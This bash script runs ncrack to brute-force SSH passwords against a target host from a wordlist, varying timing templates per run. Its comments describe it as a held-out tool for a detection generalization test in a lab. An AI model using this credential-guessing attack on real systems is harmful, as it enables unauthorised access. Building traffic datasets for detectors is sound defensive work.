#!/usr/bin/env bash
# Bruteforce HELD-OUT tool: ncrack against sshd. Reserved for the held-out-tool
# generalization test (never trained on). Each attempt is a short completed TCP session.
# ncrack has its own session/timing fingerprint distinct from hydra and medusa. Volume
# from wordlist length. Prints TOOL / START_EPOCH / END_EPOCH. No em dashes.
set -euo pipefail
TARGET=""; USER_NAME="${USER_NAME:-labuser}"; WORDLIST="${WORDLIST:-/collect/wordlists/passwords_1000.txt}"; SEED="${SEED:-$$}"
while [ $# -gt 0 ]; do case "$1" in
  --target) TARGET="${2:?}"; shift 2;;
  --user) USER_NAME="${2:?}"; shift 2;;
  --wordlist) WORDLIST="${2:?}"; shift 2;;
  --seed) SEED="${2:?}"; shift 2;;
  *) shift;; esac; done
[ -n "$TARGET" ] || { echo "usage: $0 --target <ip> [--user n] [--wordlist f]" >&2; exit 2; }

command -v ncrack >/dev/null 2>&1 || { echo "SKIP ncrack not installed" >&2; exit 3; }
[ -f "$WORDLIST" ] || { echo "SKIP wordlist missing: $WORDLIST" >&2; exit 3; }

# Vary timing template per run (T2/T3/T4) and connection rate for fingerprint spread.
TS=(2 3 4)
T="${TS[$((SEED % ${#TS[@]}))]}"

echo "TOOL ncrack -T${T} --user ${USER_NAME} -P ${WORDLIST} ssh://${TARGET}:22"
echo "START_EPOCH $(date +%s)"
# -T timing template, --user single user, -P password file. ncrack runs the whole list.
ncrack -T"$T" --user "$USER_NAME" -P "$WORDLIST" "ssh://${TARGET}:22" 2>&1 | tail -20 || true
echo "END_EPOCH $(date +%s)"
